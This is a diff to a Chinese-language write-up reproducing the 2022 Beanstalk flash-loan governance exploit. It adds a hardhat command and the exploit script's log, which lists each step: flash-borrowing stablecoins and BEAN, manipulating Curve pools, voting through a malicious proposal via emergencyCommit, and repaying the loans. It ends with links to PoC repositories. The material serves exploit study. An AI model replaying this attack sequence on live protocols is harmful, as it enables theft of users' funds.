@@ -143,11 +143,39 @@ From Uniswap V2: BEAN 3 To BeanstalkFlashloanContract For 10,883.105341079068109
 From Uniswap V2: BEAN 3 To BeanstalkFlashloanContract For 32,511,085.804104 ($4,306,662.86)Bean (BEAN)
 ```
 
-我们也只复现到这一步。合约中写了运行到那一步的序号
+我们也只复现到这一步。合约中写了运行到那一步的序号,复现如下
+```bash
+npx hardhat run .\scripts\sample-script.js
+exploitBIP address: 0xefAB0Beb0A557E452b398035eA964948c750b2Fd
+beanExploit address:  0x5D42EBdBBa61412295D7b0302d6F50aC449Ddb4F
+[1/xxx]Recieved 150M  USDT from Aave 150000000000000
+[2/xxx]Recieved 500M USDC from Aave 500000000000000
+[3/xxx]Recieved 350M DAI from Aave 350000000000000000000000000
+[4/xxx]Recieved 32.1M BEAN from Uniswap 32100950626687
+[5/xxx]Recieved 11.6M LUSD from Sushiswap 11643065703498478902362927
+[6/xxx]Add DAI USDT USDC to Curve Pool 979691328662155074401448409
+[7/xxx]exchange 3crv to lusd 26894383822701721168657777
+[8/xxx]exchange 3crv to BEAN3CRV-f 795425740813818200295323741
+[9/xxx]Add bean and lusd for BEANLUSD-f 58924887872471876761750555
+we Bip: 20
+[10/xxx]Executed Vote for BIP
+[11/xxx]EXPLOXT BIP emergencyCommit !
+[12/xxx] send  BEAN  UNI-V2   BEAN3CRV-f  BEANLUSD-f
+[13/xxx]Remove single asset liquidity from BEAN3CRV-f
+[14/xxx]Remove single asset liquidity from BEANLUSD-f
+[15/xxx]Returned to sushiswap 11678100003509005920123297
+[16/xxx]Returned to uniswap 32197543256457
+[17/xxx]Exchange LUSD to CRV from LUSDCRV-f
+[18/xxx]Remove liquidity from 3CRV Pool to get USDC, USDT & DAI back.
+```
+
 
 
 参考:
 https://github.com/JIAMING-LI/BeanstalkProtocolExploit/
+
 https://blockapex.io/beanstalk-hack-analysis-poc/
+
 https://github.com/Rivaill/CryptoVulhub/blob/master/BeanstalkFarms20220417
+
 https://learnblockchain.cn/article/3921
